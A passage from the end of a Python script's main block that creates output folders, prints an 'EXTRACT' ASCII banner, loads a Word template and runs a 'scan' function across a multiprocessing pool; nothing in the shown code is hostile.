        os.mkdir('result')

    if os.path.exists('image'):
        pass
    else:
        os.mkdir('image')

    print('''
         _____  __    __  _____   _____        ___   _____   _____  
        | ____| \ \  / / |_   _| |  _  \      /   | /  ___| |_   _| 
        | |__    \ \/ /    | |   | |_| |     / /| | | |       | |   
        |  __|    }  {     | |   |  _  /    / / | | | |       | |   
        | |___   / /\ \    | |   | | \ \   / /  | | | |___    | |   
        |_____| /_/  \_\   |_|   |_|  \_\ /_/   |_| \_____|   |_|   
    
                                                        19年5月20礼物    
    ''')
    time.sleep(3)
    document = Document(docx=os.path.join(os.getcwd(), 'default.docx'))
    pool = multiprocessing.Pool()
    for i in range(thread_s):
        pool.apply_async(func=scan,args=(sem,))
    pool.close()
    pool.join()
    import sys
    sys.exit()


